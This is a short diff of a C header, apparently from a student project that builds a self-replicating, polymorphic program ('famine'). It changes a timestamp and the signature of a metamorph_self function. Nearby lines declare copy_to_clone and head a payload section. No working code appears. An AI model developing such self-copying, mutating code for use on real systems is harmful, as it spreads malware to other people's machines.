@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/13 09:12:01 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/20 21:58:17 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -77,7 +77,7 @@ bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
 ** polymorphism
 */
 
-bool		metamorph_self();
+bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2], uint64_t client_id);
 
 /*
 ** payload
